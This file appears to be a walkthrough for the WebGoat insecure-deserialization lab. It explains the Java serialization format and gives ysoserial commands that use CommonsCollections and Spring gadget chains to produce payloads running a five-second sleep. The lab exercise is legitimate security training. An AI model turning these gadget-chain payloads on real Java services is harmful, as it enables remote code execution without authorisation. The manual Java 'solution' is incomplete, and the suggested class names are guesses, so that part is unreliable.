@@ -1,0 +1,201 @@
+====================================
+INSECURE DESERIALIZATION ATTACK
+====================================
+
+CHALLENGE: Modify a serialized Java object to cause a 5-second delay
+
+====================================
+WHAT IS JAVA DESERIALIZATION?
+====================================
+
+The original payload decodes to:
+"If you deserialize me down, I shall become more powerful than you can possibly imagine"
+
+This is a serialized Java String object. The format:
+- AC ED 00 05 = Java serialization magic number and version
+- 74 = Type code for String (TC_STRING)
+- 00 56 = Length of string (86 bytes)
+- Followed by the actual string data
+
+====================================
+THE ATTACK
+====================================
+
+To cause a 5-second delay, we need to create a malicious serialized object that:
+1. Executes code when deserialized
+2. Calls Thread.sleep(5000) or similar
+
+This requires using "gadget chains" - sequences of Java classes that,
+when chained together, allow arbitrary code execution during deserialization.
+
+====================================
+SOLUTION 1: Use ysoserial (Recommended)
+====================================
+
+ysoserial is a tool that generates malicious Java serialized objects.
+
+Download:
+https://github.com/frohoff/ysoserial/releases
+
+Common gadget chains that work with WebGoat:
+- CommonsCollections5
+- CommonsCollections6
+- Spring1
+- Spring2
+
+Generate payload for 5-second delay:
+
+LINUX/MAC:
+java -jar ysoserial.jar CommonsCollections6 "sleep 5" | base64 -w 0
+
+WINDOWS:
+java -jar ysoserial.jar CommonsCollections6 "timeout /t 5" | base64
+
+Alternative Windows command (uses ping for delay):
+java -jar ysoserial.jar CommonsCollections6 "ping -n 6 127.0.0.1" | base64
+
+====================================
+SOLUTION 2: WebGoat Built-in Classes
+====================================
+
+WebGoat might have vulnerable classes specifically for this lesson.
+Common class names to look for:
+
+1. VulnerableTaskHolder
+2. SleepTask
+3. DelayedTask
+
+If WebGoat provides hints about a specific class, you can create
+a serialized object manually or using a Java program.
+
+====================================
+SOLUTION 3: Manual Java Serialization
+====================================
+
+If you have access to Java, create a simple program:
+
+import java.io.*;
+import java.util.*;
+
+// Simple payload that sleeps for 5 seconds
+public class SerializePayload {
+    public static void main(String[] args) throws Exception {
+        // Create object that will sleep when deserialized
+        HashMap<Object, Object> map = new HashMap<>();
+        
+        // Create a payload that executes: Thread.sleep(5000)
+        // This requires a gadget chain
+        
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(map);
+        oos.close();
+        
+        byte[] payload = baos.toByteArray();
+        String base64 = Base64.getEncoder().encodeToString(payload);
+        System.out.println(base64);
+    }
+}
+
+====================================
+SOLUTION 4: Check WebGoat Source Code
+====================================
+
+WebGoat is open source. The vulnerable class might be:
+
+org.owasp.webgoat.lessons.deserialization.VulnerableTaskHolder
+
+Or similar. Check the lesson source code for hints.
+
+====================================
+COMMON YSOSERIAL PAYLOADS
+====================================
+
+Try these payloads in order:
+
+1. CommonsCollections5 (most common):
+   java -jar ysoserial.jar CommonsCollections5 "sleep 5" | base64
+
+2. CommonsCollections6:
+   java -jar ysoserial.jar CommonsCollections6 "sleep 5" | base64
+
+3. Spring1:
+   java -jar ysoserial.jar Spring1 "sleep 5" | base64
+
+4. Spring2:
+   java -jar ysoserial.jar Spring2 "sleep 5" | base64
+
+5. For Windows (use timeout instead of sleep):
+   java -jar ysoserial.jar CommonsCollections6 "timeout /t 5" | base64
+
+6. For Windows (use ping for 5-second delay):
+   java -jar ysoserial.jar CommonsCollections6 "ping -n 6 127.0.0.1" | base64
+
+====================================
+HOW TO SUBMIT THE PAYLOAD
+====================================
+
+1. Get your base64 payload from ysoserial
+2. Submit it in the WebGoat input box
+3. WebGoat will deserialize it
+4. The page should hang for exactly 5 seconds
+5. Challenge complete!
+
+====================================
+TESTING THE PAYLOAD
+====================================
+
+To verify your payload works, test it locally:
+
+echo "YOUR_BASE64_PAYLOAD" | base64 -d > payload.bin
+java -jar SerializationDumper.jar payload.bin
+
+This will show you what's in the serialized object.
+
+====================================
+TROUBLESHOOTING
+====================================
+
+If payload doesn't work:
+1. Check Java version (WebGoat likely uses Java 11 or 17)
+2. Try different gadget chains
+3. Check WebGoat console for error messages
+4. Verify the delay is EXACTLY 5 seconds (not 4 or 6)
+
+Common errors:
+- ClassNotFoundException: Wrong gadget chain for this Java version
+- InvalidClassException: Incompatible serialization version
+- No delay: Payload didn't execute, wrong gadget chain
+
+====================================
+QUICK START
+====================================
+
+If you don't have ysoserial:
+
+1. Download: https://github.com/frohoff/ysoserial/releases
+   (Get the ysoserial-master-SNAPSHOT.jar)
+
+2. Generate payload:
+   java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections6 "sleep 5" | base64 -w 0
+
+3. Copy the base64 output
+
+4. Paste into WebGoat input box
+
+5. Submit and wait for 5-second delay
+
+====================================
+ALTERNATIVE: Browser-Based Attack
+====================================
+
+If you can't use ysoserial, check if WebGoat provides hints about
+a specific vulnerable class you can use. The lesson page might show:
+
+- Example code for a vulnerable class
+- A "hint" button with the class name
+- Sample serialized objects you can modify
+
+Look for patterns in the WebGoat UI that might help!
+
+====================================
